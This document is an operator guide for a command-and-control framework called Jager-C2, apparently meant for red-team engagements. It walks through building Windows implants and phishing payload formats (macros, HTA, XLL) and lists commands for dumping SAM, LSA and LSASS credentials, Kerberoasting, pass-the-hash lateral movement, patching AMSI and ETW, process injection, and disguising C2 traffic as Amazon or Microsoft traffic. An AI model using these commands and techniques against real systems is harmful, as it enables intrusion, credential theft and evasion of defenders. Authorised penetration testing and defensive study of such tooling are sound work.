# Jager-C2 Operator Guide

## Quick Start

### 1. Deploy Infrastructure

```bash
# Docker (local/lab)
cd deploy/
docker-compose up -d

# Cloud (AWS)
cd deploy/terraform/
terraform init
terraform apply -var="engagement_id=ENG-001" -var="domain=c2.example.com"
```

### 2. Generate Operator Certificate

```bash
jager admin cert-gen --name "operator1" --role operator --output ./certs/
```

### 3. Create a Listener

```bash
jager listeners create \
  --name "https-primary" \
  --transport https \
  --host 0.0.0.0 \
  --port 443 \
  --profile amazon
```

### 4. Build an Implant

```bash
jager build implant \
  --listener https-primary \
  --os windows \
  --arch x64 \
  --format exe \
  --profile amazon \
  --output ./builds/implant.exe
```

### 5. Deploy and Wait

Deploy the implant to the target. Once it calls back:

```bash
jager sessions list
# ID        Hostname    User          OS              Transport   Last Seen
# sess-1    WORKSTA01   CORP\jsmith   Windows 10      HTTPS       2s ago
```

### 6. Interact

```bash
jager sessions interact sess-1
```

## Session Commands

| Command | Description |
|---------|-------------|
| `shell <cmd>` | Execute shell command |
| `powershell <cmd>` | Execute PowerShell |
| `upload <local> <remote>` | Upload file |
| `download <remote>` | Download file |
| `screenshot` | Take screenshot |
| `sleep <sec> <jitter%>` | Change sleep/jitter |
| `kill` | Terminate session |

## Credential Operations

| Command | Description |
|---------|-------------|
| `cred dump-sam` | Dump SAM database |
| `cred dump-lsa` | Dump LSA secrets |
| `cred dump-lsass` | Dump LSASS memory |
| `cred steal-token <pid>` | Steal process token |
| `cred make-token <domain> <user> <pass>` | Create token |
| `cred kerberoast` | Kerberoast SPNs |

## Lateral Movement

| Command | Description |
|---------|-------------|
| `lateral wmi <target> <cmd>` | WMI execution |
| `lateral scm <target> <bin>` | Service deployment |
| `lateral dcom <target> <cmd>` | DCOM execution |
| `lateral schtask <target> <cmd>` | Scheduled task |
| `lateral pth <target> <hash>` | Pass-the-hash |

## Evasion

| Command | Description |
|---------|-------------|
| `evasion patch-etw` | Patch ETW |
| `evasion patch-amsi` | Patch AMSI |
| `evasion unhook <dll>` | Unhook DLL |
| `evasion inject <pid> <tech>` | Process injection |
| `evasion sleep-mask` | Enable sleep encryption |

## Pivot/Proxy

| Command | Description |
|---------|-------------|
| `socks start <port>` | Start SOCKS5 proxy |
| `socks stop` | Stop SOCKS5 |
| `portfwd add <bind> <fwd>` | Add port forward |
| `portfwd remove <id>` | Remove port forward |
| `portfwd list` | List active forwards |

## Payload Formats

| Format | Use Case | Delivery |
|--------|----------|----------|
| `exe` | Direct execution | Phishing, file drop |
| `dll` | Side-loading, hijacking | DLL search order |
| `shellcode` | Injection, loaders | Custom loaders |
| `hta` | HTML Application | Phishing link |
| `vba` | Office macro | Document attachment |
| `msi` | Windows Installer | Trusted format |
| `cpl` | Control Panel | Double-click |
| `xll` | Excel add-in | Attachment |

## IOC Profiles

Profiles control the network fingerprint of implant traffic:

| Profile | Mimics | Best For |
|---------|--------|----------|
| `default` | Generic HTTPS | Testing |
| `amazon` | AWS API calls | Cloud environments |
| `microsoft` | Microsoft 365 traffic | Enterprise networks |

## Campaign Management

```bash
# Create campaign
jager campaign create --name "Operation Thunder"

# View timeline
jager campaign timeline --id campaign-1

# Get AI suggestions
jager campaign suggest-next --id campaign-1
```

## OPSEC Guidelines

1. **Always use jitter** - Never use 0% jitter in production
2. **Kill date** - Always set a kill date for engagements
3. **Profile selection** - Match C2 traffic to target environment
4. **Sleep time** - Production minimum: 30 seconds
5. **Cleanup** - Check `se --journal show` before engagement end
6. **Redirectors** - Never expose teamserver directly
